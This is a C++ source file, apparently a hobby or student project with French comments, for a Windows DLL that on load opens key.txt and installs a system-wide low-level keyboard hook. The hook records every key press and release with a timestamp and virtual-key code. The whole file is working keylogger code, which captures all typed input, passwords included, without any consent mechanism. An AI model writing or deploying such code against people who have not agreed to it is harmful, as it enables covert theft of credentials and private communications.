// KBHook.cpp : Définit le point d'entrée pour l'application console.
//

#include "stdafx.h"

#include <fstream>
#include <ctime>
#include <iostream>
#include <fstream>


#include "IziHook.hh"

#pragma comment(lib, "user32.lib")

bool quit = false;

#pragma data_seg(".shared")
HHOOK hook = 0;
HINSTANCE hDllInstance = 0;
#pragma data_seg()
#pragma comment(linker, "/SECTION:.shared,RWS")

//HHOOK hook{ NULL };

HANDLE tmpHandle = NULL;
HWND hWindow = 0;
std::ofstream file;
std::list<int>* keyscode = NULL;

int installThread();

LRESULT CALLBACK kbproc(
	const int ncode, const WPARAM wparam, const LPARAM lparam
)
{
	KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lparam);

	file << keyInfo.vkCode;              // File -> [timestamp]:[keycode]:[type]

	if (wparam == WM_KEYDOWN)
	{
		std::time_t t = std::time(nullptr);
		/*
		std::cout << (int)t << ":"
			<< keyInfo.vkCode << ":"
			<< "1" << std::endl;*/
		file << (int)t << ":"
			<< keyInfo.vkCode << ":"
			<< "1" << std::endl;
	}
	if (wparam == WM_KEYUP)
	{
		std::time_t t = std::time(nullptr);

		file << (int)t << ":"
			<< keyInfo.vkCode << ":"
			<< "2" << std::endl;
		std::cout << keyInfo.vkCode << "_UP ";
	}
	
	return CallNextHookEx(hook, ncode, wparam, lparam);

}

int APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, PVOID pvReserved) {
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		hDllInstance = hInstance;
		file.open("key.txt");
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&installThread, 0, 0, 0);
		//add_log("Attached.");
		break;
	case DLL_PROCESS_DETACH:
		std::cout << "Processe unattached" << std::endl;
		file.close();
		if (UnhookWindowsHookEx(hook) == 0)
			return (-1);
		return (0);
		//UninstallHook();
		break;
	}
	return TRUE;
}

int installThread()
{
	std::cout << "Processe attached" << std::endl;
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, kbproc, NULL, 0);
	if (hook == NULL)
		return (-1);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	return (0);
}

int install()
{

	return (0);
}


